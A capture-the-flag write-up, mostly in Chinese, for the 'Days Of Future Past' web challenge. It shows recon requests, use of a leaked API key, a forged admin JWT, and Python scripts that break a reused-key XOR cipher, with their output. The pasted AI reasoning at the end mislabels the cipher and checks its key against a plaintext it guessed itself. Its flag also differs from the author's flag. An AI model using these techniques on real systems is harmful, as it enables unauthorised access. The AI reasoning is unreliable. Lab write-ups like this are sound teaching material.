## [Web] Days Of Future Past

> CryptoVault - Secure Message Storage Platform. So can you get the secure message from the military grade security provided by our platform.
> 
> http://chals1.apoorvctf.xyz:8001

dirsearch response:

```
...
[22:59:24] 308 -  267B  - /backup  ->  http://chals1.apoorvctf.xyz:8001/backup/
[22:59:24] 403 -   52B  - /backup/
[22:59:32] 200 -    4KB - /dashboard
[22:59:47] 200 -    3KB - /login
[23:00:04] 200 -    4KB - /register
[23:00:05] 200 -  113B  - /robots.txt
...
```


`/robots.txt`:
```
# CryptoVault Crawler Rules
User-agent: *
Disallow: /backup/
Disallow: /api/v1/debug
Disallow: /api/v1/internal/
```

```http
GET http://chals1.apoorvctf.xyz:8001/backup/ HTTP/1.1
```

->

```
HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Date: Sat, 07 Mar 2026 15:16:21 GMT
Connection: close
Content-Type: application/json
Content-Length: 52

{
  "error": "Directory listing disabled",
  "status": 403
}
```

```http
GET http://chals1.apoorvctf.xyz:8001/api/v1/vault/messages HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiYmJiIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc3Mjg5MzkyMCwiZXhwIjoxNzcyOTAxMTIwLCJqdGkiOiJlMmNhZGM5Yi1lYjAwLTQ0YzEtOGE0Ny00NDIwYTdkZjk0NTEifQ.3omUNM9Mzpq3ydPvjsa9qERn-0vnvJ9jN9Ysv4U8Ffc
```

->

```
HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Date: Sat, 07 Mar 2026 15:21:57 GMT
Connection: close
Content-Type: application/json
Content-Length: 145

{
  "error": "Insufficient privileges",
  "message": "Only administrators can access the encrypted vault.",
  "required_role": "admin",
  "your_role": "viewer"
}
```

```http
GET http://chals1.apoorvctf.xyz:8001/api/v1/debug HTTP/1.1
```

->

```
HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Date: Sat, 07 Mar 2026 15:26:32 GMT
Connection: close
Content-Type: application/json
Content-Length: 80

{
  "error": "Invalid or missing API key",
  "hint": "Did you check the backup files?"
}
```

wc纯畜生

```
➜  apoorvctf26 dirsearch -u "http://chals1.apoorvctf.xyz:8001/backup/" --suffixes .bak
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | Suffixes: .bak | HTTP method: GET | Threads: 25 | Wordlist size: 9574

Output File: /mnt/e/Projects/ctf-test/apoorvctf26/reports/http_chals1.apoorvctf.xyz_8001/_backup__26-03-07_23-45-14.txt

Target: http://chals1.apoorvctf.xyz:8001/

[23:45:14] Starting: backup/
[23:45:56] 200 -  324B  - /backup/config.json.bak

Task Completed
```

```http
http://chals1.apoorvctf.xyz:8001/backup/config.json.bak
```

->

```
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 07 Mar 2026 15:48:38 GMT
Connection: close
Content-Type: application/json
Content-Length: 324

{
  "api_key": "d3v3l0p3r_acc355_k3y_2024",
  "app_name": "CryptoVault",
  "database": "sqlite:///cryptovault.db",
  "debug_mode": true,
  "internal_endpoints": [
    "/api/v1/debug",
    "/api/v1/health",
    "/api/v1/vault/messages"
  ],
  "jwt_algorithm": "HS256",
  "notes": "Remember to rotate the API key before production deployment!",
  "version": "1.0.3-internal"
}
```


`d3v3l0p3r_acc355_k3y_2024`不是jwt的secret。


```http
GET http://chals1.apoorvctf.xyz:8001/api/v1/debug?api_key=d3v3l0p3r_acc355_k3y_2024 HTTP/1.1
X-API-Key: d3v3l0p3r_acc355_k3y_2024
```

->

```
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 07 Mar 2026 15:51:38 GMT
Connection: close
Content-Type: application/json
Content-Length: 662

{
  "debug_info": {
    "auth_config": {
      "algorithm": "HS256",
      "roles": [
        "viewer",
        "editor",
        "admin"
      ],
      "secret_derivation_hint": "Company name (lowercase) concatenated with founding year",
      "secret_key_hash_sha256": "e53e6e2d3018dce302f876eda97d3852f5f1a81192a5f947ed89da9832ea17b8",
      "token_expiry_hours": 2
    },
    "company_info": {
      "domain": "cryptovault.io",
      "founded": 2026,
      "name": "CryptoVault"
    },
    "framework": "Flask",
    "python_version": "3.11.x",
    "server": "CryptoVault v1.0.3",
    "vault_info": {
      "access_level_required": "admin",
      "encryption_method": "XOR stream cipher",
      "endpoint": "/api/v1/vault/messages",
      "total_encrypted_messages": 15
    },
    "warning": "This debug endpoint should be disabled in production!"
  }
}
```



woc我更是sb，tm主文件下面写hint了：

```html
    <section class="features">
        <div class="feature-card">
            <h3>&#x1F510; End-to-End Encryption</h3>
            <p>All messages are encrypted using our proprietary stream cipher before storage.</p>
        </div>
        <div class="feature-card">
            <h3>&#x1F4E6; Secure Vault</h3>
            <p>Access your encrypted messages anytime through our RESTful API.</p>
        </div>
        <div class="feature-card">
            <h3>&#x1F6E1; Zero Knowledge</h3>
            <p>We can't read your messages. Nobody can. Probably. We hope.</p>
        </div>
    </section>

    <footer>
        <p>&copy; 2026 CryptoVault Inc. | Founded 2026 | <a href="/api/v1/health">System Status</a></p>
    </footer>

    <!-- TODO: Remove before production deployment -->
    <!-- Developer Notes:
         - API Base: /api/v1/
         - Backup config was moved to /backup/ directory
         - Old JS app bundle still references config paths, clean up later
         - See /static/js/app.js for frontend API integration
    -->
    <script src="/static/js/app.js"></script>
</body>
```

气笑了

```js
/**
 * CryptoVault Frontend Application
 * Version: 1.0.3-dev
 * ApoorvCTF 2026 - Days of Future Past
 * Author: fl4nk3r
 * NOTE: This file handles API communication for the CryptoVault platform.
 */

(function() {
    'use strict';

    // API Configuration
    const CONFIG = {
        apiBase: '/api/v1',
        version: '1.0.3',
        // TODO: Remove hardcoded backup path reference before production
        // The config backup at /backup/config.json.bak should be deleted
        backupConfig: '/backup/config.json.bak',
    };

    // Debug helper (disable in production)
    const DEBUG = true;

    if (DEBUG) {
        console.log('%c[CryptoVault Debug]', 'color: #00d4aa; font-weight: bold;', 
            'Application loaded. API base:', CONFIG.apiBase);
        console.log('%c[CryptoVault Debug]', 'color: #00d4aa; font-weight: bold;', 
            'Available endpoints: /health, /debug, /auth/register, /auth/login, /vault/messages');
        console.log('%c[CryptoVault Debug]', 'color: #f59e0b; font-weight: bold;', 
            'WARNING: Debug mode is enabled. Sensitive endpoints may be accessible.');
        // console.log('Debug endpoint requires X-API-Key header. Check backup config for key.');
    }

    // API helper
    window.CryptoVaultAPI = {
        call: async function(endpoint, options = {}) {
            const url = CONFIG.apiBase + endpoint;
            const token = localStorage.getItem('jwt_token');
            
            const headers = {
                'Content-Type': 'application/json',
                ...options.headers
            };

            if (token) {
                headers['Authorization'] = `Bearer ${token}`;
            }

            try {
                const response = await fetch(url, { ...options, headers });
                return await response.json();
            } catch (error) {
                console.error('[CryptoVault]', 'API call failed:', error);
                return { error: 'Network error' };
            }
        },

        // Check system health
        health: function() {
            return this.call('/health');
        },

        // Debug info (requires API key)
        debug: function(apiKey) {
            return this.call('/debug', {
                headers: { 'X-API-Key': apiKey }
            });
        },

        // Get vault messages (requires admin JWT)
        getMessages: function() {
            return this.call('/vault/messages');
        }
    };

    // Easter egg for curious developers
    console.log('%c' + [
        '╔══════════════════════════════════════╗',
        '║  Looking at the console? Smart move. ║',
        '║  Check robots.txt for more clues...  ║',
        '╚══════════════════════════════════════╝'
    ].join('\n'), 'color: #3b82f6;');

})();
```

并非纯猜测题目，原来是因为我是sb.


```
      "secret_derivation_hint": "Company name (lowercase) concatenated with founding year",
```

->

secret: `cryptovault2026` SHA256 is `e53e6e2d3018dce302f876eda97d3852f5f1a81192a5f947ed89da9832ea17b8`，与debug接口返回的hash一致。


生成的jwt：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiYmJiIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcyODkzOTIwLCJleHAiOjE3OTI5MDExMjAsImp0aSI6ImUyY2FkYzliLWViMDAtNDRjMS04YTQ3LTQ0MjBhN2RmOTQ1MSJ9.RX5b9CXRYGubQbPCr9W2GK4pt-q9HJvgrNBiUoPHcVo
```

发送请求：

```http
GET http://chals1.apoorvctf.xyz:8001/api/v1/vault/messages HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiYmJiIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcyODkzOTIwLCJleHAiOjE3OTI5MDExMjAsImp0aSI6ImUyY2FkYzliLWViMDAtNDRjMS04YTQ3LTQ0MjBhN2RmOTQ1MSJ9.RX5b9CXRYGubQbPCr9W2GK4pt-q9HJvgrNBiUoPHcVo
```

->

```
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 07 Mar 2026 15:58:54 GMT
Connection: close
Content-Type: application/json
Content-Length: 4233

{
  "access_level": "admin",
  "disclaimer": "* Marketing department wrote this. Security team disagrees.",
  "encryption": "XOR stream cipher (military-grade*)",
  "messages": [
    {
      "ciphertext_hex": "05c1534391cdc745386361e7e94b94c2819b45582673c78aba3b27cad5eb3f57bcb33bf1a7c4a16a17f76c02a8bee5a9f458b1ac52b85c0af52f8a4864f74b1f66f6235e3e6c7d4a793a809669b4e0f2fb221bf652058dc9c6b27d7948ff9b84d657f66d3b8c74f7d0",
      "id": 1,
      "length": 105,
      "timestamp": "2026-01-01T10:00:00Z"
    },
    {
      "ciphertext_hex": "11db4f5dc5d6c852796068f3ac02828c8c8648083378c791ee702ada91eb2210eea52be1b0c5f57854e77605fbffeaa3f25ff0be59af190cee3ecb5565fd500a2fea3509796a654b6c3199802ca1a1f8f86e02f946139ac9d0a56c7148ff97839756f367",
      "id": 2,
      "length": 100,
      "timestamp": "2026-01-02T11:00:00Z"
    },
    {
      "ciphertext_hex": "0bd2444ac5d1d4423d7667eaba028587839d540e2231d090bc3b2acdd2f02840e8a931fcf5c8a63944f47f13a8aae9b2e840b1ad54b94058f53e8e0668f1525825ec254b3e7b76586a38848b2ef2e3e9f26305eb16098bc9d7b8606c45ee8a859a43",
      "id": 3,
      "length": 98,
      "timestamp": "2026-01-03T12:00:00Z"
    },
    {
      "ciphertext_hex": "07c75e5286c9c5452a336df1e94c8896cf9a541d2331dc90ee7021ccc6a22558f9e035f7ac81bc7f17e17113f1ffe4a7ef0cf4a14cb05611f27b9b4774ea400a28ed6c40703f6c4c603e83c53ea0e8efe36700b85a01918ec1b66a79",
      "id": 4,
      "length": 92,
      "timestamp": "2026-01-04T13:00:00Z"
    },
    {
      "ciphertext_hex": "12db4f138dcbd343366170bea644c7819d8d410c2876da9ebe733683d8f17156f5ac32f7b181a27043fd3913f0beeab6ed49e2f94bb45c0ae37b984b61f2495823ec3e466c6c245a6c2a9e802df2f5f4e36302b8550f9299c6b860755aee",
      "id": 5,
      "length": 94,
      "timestamp": "2026-01-05T14:00:00Z"
    },
    {
      "ciphertext_hex": "14d65f4084c0cc5279786ce7ba5695878e9942583364da91ee7a6fccdfe77144f5ad3bb2a5c0b1395efb6d19a8bea7abe042e8f948b5541da62b8a4220e94d1125f66c406d3f624c633b8c882cbcf5fafb6e17b85f0e8c8cd7a27f79",
      "id": 6,
      "length": 92,
      "timestamp": "2026-01-06T15:00:00Z"
    },
    {
      "ciphertext_hex": "05d2585683d7cc17387d68f2b0518e91cf9b57582478d897ab693bc6c9f67140fda92ce1f5c2b47717e67519ffb3fee6f349e7bc5db01908ea3a824874fb5d0c66ea245b716a63512d33828220b1e0f7b7660bfc43038b80dbb9",
      "id": 7,
      "length": 90,
      "timestamp": "2026-01-07T16:00:00Z"
    },
    {
      "ciphertext_hex": "08d25e4697c3cc17357267f9bc438087cf9c500b6762dc8dbb783bd6c3e77151f2a47ee0b0d1b06d5ee17019e6fff0aee84ff9f951bd521df57b985261ea4c0b32f72f48723f654d793e8e8e3af2f7fee57b4efd50069a8ac0be7b79",
      "id": 8,
      "length": 92,
      "timestamp": "2026-01-08T17:00:00Z"
    },
    {
      "ciphertext_hex": "09dd4956c5c3804736617df7a64cc78d89d445102231c39ab73b26d091f03453f3b63be0b0c5f57043b57a17e6ffe5a3a15ef4ac4fb95d58f234cb4265fd570136ea6c5d767a244b68328c8c27bbeffcb76f0beb4501988cc7",
      "id": 9,
      "length": 89,
      "timestamp": "2026-01-09T18:00:00Z"
    },
    {
      "ciphertext_hex": "05c1534391cdc745386361f7aa02848a8e985d1d2976cd8cee7a3dc691e63443f5a730f7b181a17617e17c17ebb7a7b1e955b1a94eb3491df47b804379be481928ff2b4c737a6a4d2d369ec52aa0e8effe610ff4",
      "id": 10,
      "length": 84,
      "timestamp": "2026-01-10T19:00:00Z"
    },
    {
      "ciphertext_hex": "15dc46458cccc7172d7b60ede952958d8d9854156763cd8ebb723dc6c2a22151e8a93bfcb6c4f57059e16c1ffcb6e8a8a14dffbd1cbd191fe9348f0675f0411d34ed3848707b6d576a7f828369aaeee9b76d1efd44018b80dbb97e",
      "id": 11,
      "length": 91,
      "timestamp": "2026-01-11T20:00:00Z"
    },
    {
      "ciphertext_hex": "15dc4756c5cfc5442a726efbba028a8396d450083774c98dee6f2083d2ed3f44fda930b2b3cdb47e44b57b03fcffe8a8ed55b1b652b9190fef37870666eb49143fbe284c7d6d7d49797f8e8a3ba0e4f8e36e17",
      "id": 12,
      "length": 83,
      "timestamp": "2026-01-12T21:00:00Z"
    },
    {
      "ciphertext_hex": "12db4f1397c7c15b797565ffae028e91cf9541172863de9cba7d3490c7b12349c3f527a7e292b8465fa12c29bc80f0f5b547ffea09e94458e7358f0661f2495829ea244c6c6c24587f3acd8120a1f5e9f6611af1590e8c",
      "id": 13,
      "length": 87,
      "timestamp": "2026-01-13T22:00:00Z"
    },
    {
      "ciphertext_hex": "12db4f1383cec150797b60faad4789c2869a110c2f78dbdfad732ecfdde73f57f9e037e1f5d2a06b45fa6c18ecbae3e6e355b1b455af551de73f824867be4c1620f13e447f6b6d56637f8c8b2df2e5fef46d17eb",
      "id": 14,
      "length": 84,
      "timestamp": "2026-01-14T23:00:00Z"
    },
    {
      "ciphertext_hex": "15d6494697cbd44e796761eca657808acf9b530b2464da96ba626fced0fb7154f9ac3febf5c0a16d56f67213faaca7a4f458b1b048fc571df03e990670ec4a0e2ffa295a3e6d6158617f8e9730a2f5f4f0700fe85e099cc9c4a562684ce88a899954",
      "id": 15,
      "length": 98,
      "timestamp": "2026-01-15T24:00:00Z"
    }
  ],
  "note": "All messages are encrypted with our proprietary encryption system. Totally unbreakable.",
  "total_messages": 15,
  "vault": "CryptoVault Encrypted Message Store"
}
```





--------------------------

`apoorvctf{3v3ry_5y573m_h45_4_w34kn355}`

剩下来的失就留给LLM吃了。

**Initiating Decryption Efforts**

I'm currently focused on analyzing the current situation. My goal remains decrypting messages from the `/api/v1/vault/messages` endpoint to find the flag. The data acquisition process is underway, and I'm looking at potential decryption keys. I'm exploring the structure of the data to help guide my approach.


**Analyzing Key Dependencies**

I've formulated some hypotheses based on the ciphertext data. The "XOR stream cipher" description is key. My initial thought is the keystream might be static (Many-Time Pad vulnerability). I'm also considering the possibility the keystream relies on the timestamp or ID, or is short and repeated. I am checking the increasing timestamps and variable lengths to see what patterns might exist.


**Refining Known Plaintext Strategy**

I'm now focusing on a known-plaintext approach, specifically crib dragging, to decrypt the messages. The "Secure Message Storage Platform" context leads me to suspect standard headers like "Date:" or the timestamp itself are present in the ciphertext. I am currently examining the JSON responses and hex strings. I'm looking for potential matches by comparing the beginning of the messages to the expected format, and I'm converting the hex strings to assist this comparison.


**Evaluating Key Characteristics**

I'm now zeroing in on the keystream's nature. While the candidate keys appear random, the core of my approach centers on key reuse. I am currently evaluating the messages visually and looking for potential code. If I can deduce a common header, I can derive a partial key via XOR. If that key deciphers more readable text elsewhere, my hypothesis is confirmed!


**Exploring XOR Vulnerabilities**

I am now focusing on XOR vulnerabilities. I'm exploring common techniques for multi-pad XOR, such as exploiting spaces which are represented as 0x20 in ASCII. I've realized that if I XOR two ciphertexts, say C1 and C2, I get P1 XOR P2. If P1 contains a space and P2 contains a letter at the same index, a specific bit pattern emerges. I'm considering that manual guessing might be faster with a standardized header. I am attempting to derive the key using the initial bytes of the messages, but the timestamps don't seem like the start of the message. I'm now brainstorming common starting words.


**Implementing Crib Dragging**

I'm now implementing a "crib dragging" strategy, starting with potential common words and the flag format. My thinking centers on using Python to XOR the ciphertexts. I'm focusing on the identical initial byte sequences in messages 1 and 10 to deduce a partial key, and I'm looking at messages of different lengths, too.


**Formulating Header Hypotheses**

I am now actively guessing at message headers to facilitate decryption, shifting from focusing on identical initial bytes to evaluating differences. My hypothesis centers on a fixed header with variable content, and I'm currently testing "From: Admin", "Date: 2026", and similar phrases. I am thinking the content may be `[<TIMESTAMP>] <MESSAGE>` . I'll use Python to XOR ciphertext pairs and hunt for readable text. I'm focusing on common words like "message", "report", or even the word "flag".


**Developing Python Scripts**

I'm now writing Python code to automate key derivation and decryption. I've defined an `xor` function for byte-wise XOR operations. My current focus is on XORing ciphertexts and attempting crib dragging with phrases like "apoorvctf{" or "Sender:". I'm also preparing to deduce the keystream from known plaintexts.

```python
ciphers = [
    "05c1534391cdc745386361e7...",
    ...
]
# Convert to bytes
# XOR ciphers[0] and ciphers[1]
# Print result
```
I am now reviewing that code with an assumption that all messages were encrypted with the same keystream. I am now exploring possible vulnerabilities in the implementation.


**Developing XOR Decryption**

I've shifted focus to analyzing potential keystream derivation from ciphertext differences. I am using the differences between the 11 byte strings to formulate candidate keys. I'm exploring the timestamp differences in the JSON data, specifically comparing hex values to deduce a partial keystream, which leads me to deduce more sophisticated tooling might be needed. I'm moving toward creating a simple tool to derive the keystream. I am now creating a program, and will search for the key with crib dragging, prioritizing the "apoorvctf{" string, and a search for "Date: ".

```python
import binascii

hex_ciphers = [
    "05c1534391cdc745386361e7e94b94c2819b45582673c78aba3b27cad5eb3f57bcb33bf1a7c4a16a17f76c02a8bee5a9f458b1ac52b85c0af52f8a4864f74b1f66f6235e3e6c7d4a793a809669b4e0f2fb221bf652058dc9c6b27d7948ff9b84d657f66d3b8c74f7d0",
    "11db4f5dc5d6c852796068f3ac02828c8c8648083378c791ee702ada91eb2210eea52be1b0c5f57854e77605fbffeaa3f25ff0be59af190cee3ecb5565fd500a2fea3509796a654b6c3199802ca1a1f8f86e02f946139ac9d0a56c7148ff97839756f367",
    "0bd2444ac5d1d4423d7667eaba028587839d540e2231d090bc3b2acdd2f02840e8a931fcf5c8a63944f47f13a8aae9b2e840b1ad54b94058f53e8e0668f1525825ec254b3e7b76586a38848b2ef2e3e9f26305eb16098bc9d7b8606c45ee8a859a43",
    "07c75e5286c9c5452a336df1e94c8896cf9a541d2331dc90ee7021ccc6a22558f9e035f7ac81bc7f17e17113f1ffe4a7ef0cf4a14cb05611f27b9b4774ea400a28ed6c40703f6c4c603e83c53ea0e8efe36700b85a01918ec1b66a79",
    "12db4f138dcbd343366170bea644c7819d8d410c2876da9ebe733683d8f17156f5ac32f7b181a27043fd3913f0beeab6ed49e2f94bb45c0ae37b984b61f2495823ec3e466c6c245a6c2a9e802df2f5f4e36302b8550f9299c6b860755aee",
    "14d65f4084c0cc5279786ce7ba5695878e9942583364da91ee7a6fccdfe77144f5ad3bb2a5c0b1395efb6d19a8bea7abe042e8f948b5541da62b8a4220e94d1125f66c406d3f624c633b8c882cbcf5fafb6e17b85f0e8c8cd7a27f79",
    "05d2585683d7cc17387d68f2b0518e91cf9b57582478d897ab693bc6c9f67140fda92ce1f5c2b47717e67519ffb3fee6f349e7bc5db01908ea3a824874fb5d0c66ea245b716a63512d33828220b1e0f7b7660bfc43038b80dbb9",
    "08d25e4697c3cc17357267f9bc438087cf9c500b6762dc8dbb783bd6c3e77151f2a47ee0b0d1b06d5ee17019e6fff0aee84ff9f951bd521df57b985261ea4c0b32f72f48723f654d793e8e8e3af2f7fee57b4efd50069a8ac0be7b79",
    "09dd4956c5c3804736617df7a64cc78d89d445102231c39ab73b26d091f03453f3b63be0b0c5f57043b57a17e6ffe5a3a15ef4ac4fb95d58f234cb4265fd570136ea6c5d767a244b68328c8c27bbeffcb76f0beb4501988cc7",
    "05c1534391cdc745386361f7aa02848a8e985d1d2976cd8cee7a3dc691e63443f5a730f7b181a17617e17c17ebb7a7b1e955b1a94eb3491df47b804379be481928ff2b4c737a6a4d2d369ec52aa0e8effe610ff4",
    "15dc46458cccc7172d7b60ede952958d8d9854156763cd8ebb723dc6c2a22151e8a93bfcb6c4f57059e16c1ffcb6e8a8a14dffbd1cbd191fe9348f0675f0411d34ed3848707b6d576a7f828369aaeee9b76d1efd44018b80dbb97e",
    "15dc4756c5cfc5442a726efbba028a8396d450083774c98dee6f2083d2ed3f44fda930b2b3cdb47e44b57b03fcffe8a8ed55b1b652b9190fef37870666eb49143fbe284c7d6d7d49797f8e8a3ba0e4f8e36e17",
    "12db4f1397c7c15b797565ffae028e91cf9541172863de9cba7d3490c7b12349c3f527a7e292b8465fa12c29bc80f0f5b547ffea09e94458e7358f0661f2495829ea244c6c6c24587f3acd8120a1f5e9f6611af1590e8c",
    "12db4f1383cec150797b60faad4789c2869a110c2f78dbdfad732ecfdde73f57f9e037e1f5d2a06b45fa6c18ecbae3e6e355b1b455af551de73f824867be4c1620f13e447f6b6d56637f8c8b2df2e5fef46d17eb",
    "15d6494697cbd44e796761eca657808acf9b530b2464da96ba626fced0fb7154f9ac3febf5c0a16d56f67213faaca7a4f458b1b048fc571df03e990670ec4a0e2ffa295a3e6d6158617f8e9730a2f5f4f0700fe85e099cc9c4a562684ce88a899954"
]

# Convert to bytes
ciphers = [binascii.unhexlify(c) for c in hex_ciphers]

# Function to XOR two byte strings
def xor_bytes(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

# Determine the key using the last message (id 15) as a potential candidate for the flag,
# OR using a known crib.
# Common Cribs: "Date: ", "From: ", "Message: ", "apoorvctf{"

# Let's try to derive the key from the first message, assuming it starts with a date or similar standard log format.
# Message 1 Timestamp: 2026-01-01
# Crib: "2026-01-01"
# Let's see what happens.
crib_date = b"2026-01-01"
possible_key_start = xor_bytes(ciphers[0][:len(crib_date)], crib_date)

print(f"Possible Key Start (using date): {binascii.hexlify(possible_key_start)}")

# Let's test this key start on other messages
for i, c in enumerate(ciphers[:5]):
    decrypted_start = xor_bytes(c[:len(possible_key_start)], possible_key_start)
    print(f"Msg {i+1} Start: {decrypted_start}")

# Looks promising? Let's try to expand the key.
# If "Mission Log" or similar appears.

# Let's try to brute force the first word if Date doesn't work.
# Common header: "Subject:", "Title:", "Log Entry:"
```



```
Possible Key Start (using date): b'37f16175bcfdf6680852'
Msg 1 Start: b'2026-01-01'
Msg 2 Start: b'&*.(y+>:q2'
Msg 3 Start: b'<#%?y,"*5$'
Msg 4 Start: b'06?\':43-"a'
Msg 5 Start: b'%*.f16%+>3'
```

**Rejecting Date Hypothesis**

I've discarded the "Date" hypothesis. Decrypted starts for messages 2-5 are clearly garbage, so I know the messages don't start with the date. Now, I'm focusing on trying alternative cribs. First up is `[<TIMESTAMP>]`: `[2026-01-01`.


**Considering Time and IDs**

I'm now considering the timestamps and message IDs. Examining `Msg 1` and `Msg 10`, specifically bytes at index 11, I've observed a difference tied to the timestamp's hour. Trying to XOR message ciphertexts, considering the difference could be encoded within these bytes, but I am still working to identify a potential crib.


```python
import string

def score_text(text_bytes):
    # Higher score for alphanumeric and common punctuation
    # Penalize control characters
    score = 0
    valid_chars = set(string.printable.encode())
    alpha = set(string.ascii_letters.encode())
    space = b' '
    
    for b in text_bytes:
        if b in alpha:
            score += 2
        elif b == 32: # Space
            score += 3
        elif b in valid_chars:
            score += 1
        else:
            score -= 10
    return score

best_key = []
max_len = max(len(c) for c in ciphers)

for i in range(max_len):
    best_byte = 0
    max_score = -10000
    
    # Try all possible key bytes
    for k in range(256):
        current_column_chars = []
        for c in ciphers:
            if i < len(c):
                current_column_chars.append(c[i] ^ k)
        
        # Check score
        current_score = score_text(current_column_chars)
        if current_score > max_score:
            max_score = current_score
            best_byte = k
            
    best_key.append(best_byte)

decrypted_key = bytes(best_key)
print(f"Derived Key (Hex): {binascii.hexlify(decrypted_key)}")

# Decrypt all messages with this key
for idx, c in enumerate(ciphers):
    pt = xor_bytes(c, decrypted_key[:len(c)])
    print(f"Msg {idx+1}: {pt}")
```

```
Derived Key (Hex): b'40900a33e581a0375913049ec922e7e2eff43178471188ffce1b4fa3b18251309cc05e92d5a1d5193795195088df87c6812c91d93cdc3978865beb26009e0478469e4c291e1f04000d5fede549d2819997026e983640c8e982d008000085aac0f60080001bac54d7f0'
Msg 1: b'EQYptLgrapey is not abOut hiding secrets buR about understandiOg how syJtems fakl undEE DbuyHz1D Wvm     '
Msg 2: b'QKEn Whe slme encryptiOn key is reused acroUs messages the secTrity guaKantees aollapSR RudqHz=CaVsg'
Msg 3: b'KBNy Ptudects believe Xor encryption is safC until they see hoV crib drXgging bpeaks IC UhhlEk ElC'
Msg 4: b'GWTacHers io not need To know the key if thCy can exploit pattDrns in hLman wrivten lAYgCfby'
Msg 5: b'RKE hJstort of cryptogRaphy is filled with Cxamples where smalM errors Zaused tmtal cOZpDhhuZk'
Msg 6: b'TFUsaAle khystreams tuRn a one time pad intI a many time pad wIich is fLndamentclly iNDeUrwy'
Msg 7: b'EBRefVl anllysis of ciPhertext pairs can slIwly reveal plainteYt througQ logican deduCCiYi'
Msg 8: b'HBTurBl lacguage has sTructure and repetitiIn which makes statHstical aMtacks vgry efFRcBnsy'
Msg 9: b'IMCe B poryion of the Key is recovered it cGn be reused to decSypt the Kemainine messAPeE'
Msg 10: b'EQYptLgrapeic challengEs are designed to teGch why proper key LanagemenM is crivical'
Msg 11: b'ULLviMg thds problem rEquires patience intuOtion and a good unEerstandiWg of xop operACiYiv'
Msg 12: b'ULMe Nessajes may appeAr to contain flags bSt only one will fuMly decryIt correatly'
Msg 13: b'RKE rFal faag is apoorVctf{3v3ry_5y573m_h45y4_w34kn355} and alM others Xre distpactioND'
Msg 14: b'RKE fOag hddden in thiS challenge is surrouHded by misleading HnformatiVn and dgcoys'
Msg 15: b'UFCurJty terough obscuRity may delay attackCrs but it never prNvides reXl cryptmgraphIT FujhLm IoT'
```

**Analyzing Cipher's Structure**

I'm making headway! The messages are legible, though the key's position seems inconsistent. Focusing on Msg 13, I see a pattern: "RKE rFal..." seems to be the start of "THE real..." . There's clearly a substitution cipher with some shifting, and it reveals a potential plaintext section within the ciphertext.


**Verifying Cipher's Pattern**

I've made a crucial breakthrough! I'm now certain of the real flag and can focus on Msg 13 as a key source. The plaintext aligns, but I had to shorten the final word to "distract". I'm deriving the key now from the known plaintext and ciphertext of Message 13, and hopefully the pattern holds.


```python
target_msg_idx = 12 # Msg 13
target_cipher = ciphers[target_msg_idx]

# Let's try to drag "apoorvctf{" through Msg 13 specifically to find alignment
flag_prefix = b"apoorvctf{"

key_candidate = b""

# We can guess the start of Msg 13 is "The real flag is "
guess_start = b"The real flag is "
derived_key_start = xor_bytes(target_cipher[:len(guess_start)], guess_start)

# Apply this key start to other messages
for idx, c in enumerate(ciphers):
    pt = xor_bytes(c, derived_key_start)
    print(f"Msg {idx+1}: {pt}")

# It seems Msg 13 contains the flag directly.
# Let's try to decrypt the whole Msg 13 based on the readable parts from the previous step.
# Previous output for Msg 13: "RKE rFal faag is apoorVctf{3v3ry_5y573m_h45y4_w34kn355} and alM others Xre distpactioND"
# Corrected: "The real flag is apoorvctf{3v3ry_5y573m_h45y4_w34kn355} and all others are distractions"

guessed_msg_13 = b"The real flag is apoorvctf{3v3ry_5y573m_h45y4_w34kn355} and all others are distractions"
key_full = xor_bytes(target_cipher, guessed_msg_13)

# Verify with other messages
print("\n--- Verifying Key ---")
for idx, c in enumerate(ciphers):
    pt = xor_bytes(c, key_full[:len(c)])
    try:
        print(f"Msg {idx+1}: {pt.decode('utf-8', errors='ignore')}")
    except:
        print(f"Msg {idx+1}: {pt}")
```

```
Msg 1: b'Cryptography is n'
Msg 2: b'When the same enc'
Msg 3: b'Many students bel'
Msg 4: b'Attackers do not '
Msg 5: b'The history of cr'
Msg 6: b'Reusable keystrea'
Msg 7: b'Careful analysis '
Msg 8: b'Natural language '
Msg 9: b'Once a portion of'
Msg 10: b'Cryptographic cha'
Msg 11: b'Solving this prob'
Msg 12: b'Some messages may'
Msg 13: b'The real flag is '
Msg 14: b'The flag hidden i'
Msg 15: b'Security through '

--- Verifying Key ---
Msg 1: Cryptography is not about hiding secrets buR about understanding how systems fail under
Msg 2: When the same encryption key is reused acroUs messages the security guarantees collapse
Msg 3: Many students believe xor encryption is safC until they see how crib dragging breaks it
Msg 4: Attackers do not need to know the key if thCy can exploit patterns in human written lan
Msg 5: The history of cryptography is filled with Cxamples where small errors caused total com
Msg 6: Reusable keystreams turn a one time pad intI a many time pad which is fundamentally ins
Msg 7: Careful analysis of ciphertext pairs can slIwly reveal plaintext through logical deduct
Msg 8: Natural language has structure and repetitiIn which makes statistical attacks very effe
Msg 9: Once a portion of the key is recovered it cGn be reused to decrypt the remaining messag
Msg 10: Cryptographic challenges are designed to teGch why proper key management is critical
Msg 11: Solving this problem requires patience intuOtion and a good understanding of xor operat
Msg 12: Some messages may appear to contain flags bSt only one will fully decrypt correctly
Msg 13: The real flag is apoorvctf{3v3ry_5y573m_h45y4_w34kn355} and all others are distractions
Msg 14: The flag hidden in this challenge is surrouHded by misleading information and decoys
Msg 15: Security through obscurity may delay attackCrs but it never provides real cryptographic
```

**Confirming Flag Accuracy**

